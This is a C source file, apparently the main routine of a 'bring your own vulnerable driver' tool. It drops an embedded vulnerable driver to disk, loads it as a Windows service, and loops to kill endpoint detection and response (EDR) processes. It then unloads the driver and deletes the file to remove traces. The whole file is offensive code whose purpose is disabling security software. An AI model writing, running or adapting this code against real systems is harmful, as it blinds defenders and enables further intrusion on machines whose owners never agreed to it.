#include "common.h"
#include "vdriver.h"

int main() {

	BOOL	bSTATE				= TRUE;
	LPWSTR	szVulnDriverPath	= NULL; // Stores the path to the vulnerable driver

	// Write the vulnerable driver to the file system
	info("WriteDriverToFile - Writing vulnerable driver to filesystem");
	if (!WriteDriverToFile(g_VULNDRIVERFILENAME, cVDriver, cVDriverLength, &szVulnDriverPath)) {
		error("Failed to write driver to filesystem");
		if (szVulnDriverPath) {
			free(szVulnDriverPath); // Free the allocated memory
		}
		return EXIT_FAILURE;
	}
	okayW(L"WriteDriverToFile - Written vulnerable driver to \"%s\"", szVulnDriverPath);
	printf("\n");

	// Load the vulnerable driver as a service
	infoW(L"LoadDriver - Loading vulnerable driver from \"%s\" with name \"%s\"", szVulnDriverPath, g_VULNDRIVERNAME);
	if (!LoadDriver(g_VULNDRIVERNAME, szVulnDriverPath)) {
		error("LoadDriver - Failed to load driver");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	okayW("LoadDriver - Loaded vulnerable driver, servicename: \"%s\"", g_VULNDRIVERNAME);
	printf("\n");

	// Kill EDR Processes and keep looping till q is hit
	infoW(L"KillEdrProcesses - Looping over the EDR processes and killing them");
	if (!KillEdrProcesses()) {
		error("KillEdrProcesses - Failed");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	okayW("KillEdrProcesses - Completed");
	printf("\n");

	// ** CLEANUP SECTION ** //

_cleanUp:

	// Unloading vulnerable driver
	infoW(L"UnloadDriver - Unloading vulnerable driver \"%s\"", g_VULNDRIVERNAME);
	if (!UnloadDriver(g_VULNDRIVERNAME)) {
		error("UnloadDriver - Failed to unload driver");
		bSTATE = FALSE;
	}
	okayW("UnloadDriver - Unloaded vulnerable driver \"%s\"", g_VULNDRIVERNAME);
	printf("\n");

	// Remove vulnerable driver from filesystem
	infoW(L"RemoveFileW - Vulnerable driver \"%s\"", szVulnDriverPath);
	if (!RemoveFileW(szVulnDriverPath)) {
		error("RemoveFileW - Failed to delete file");
		bSTATE = FALSE;
	}
	okayW("RemoveFileW - Deleted vulnerable driver \"%s\"", szVulnDriverPath);
	printf("\n");

	// Free allocated memory
	if (szVulnDriverPath != NULL) {
		free(szVulnDriverPath);
	}

	if (bSTATE) {
		return EXIT_SUCCESS;
	}
	else {
		return EXIT_FAILURE;
	}

}
